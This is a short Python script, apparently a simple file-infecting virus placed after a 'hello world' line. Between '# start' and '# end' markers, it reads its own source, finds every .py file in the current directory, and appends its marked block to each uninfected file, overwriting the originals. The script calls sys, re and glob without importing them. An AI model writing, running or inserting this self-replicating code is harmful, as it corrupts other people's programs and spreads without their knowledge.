print("hello world")# start
virus = []

# opening
myFile = sys.argv[0]
virusFile = open(myFile, "r")
allLines = virusFile.readlines()
virusFile.close()

# save into list
inVirus = False
for line in allLines:
    
    if (re.search("^# start",line)):
        inVirus = True

        # in virus then appending in list
    if (inVirus == True):
        virus.append(line)

    if (re.search("^# end", line)):
        break

# victims
prgs = glob.glob("*.py")

# check and infect
for p in prgs:
    file = open(p, "r")
    prgCode = file.readlines()
    file.close()
    # print(prgCode)

    # check if infected
    infected = False
    for line in prgCode:
        if (re.search("^# start", line)):
            infected = True
            break
    
    if not infected:
        newCode = []
        newCode = prgCode
        newCode.extend(virus)
        # print(p, newCode)

        #write new version to file to overwrite the original
        file = open(p, "w")
        # print(file)
        file.writelines(newCode)
        file.close()

#do the virus work
print("file infected")
# print(allLines)
# end
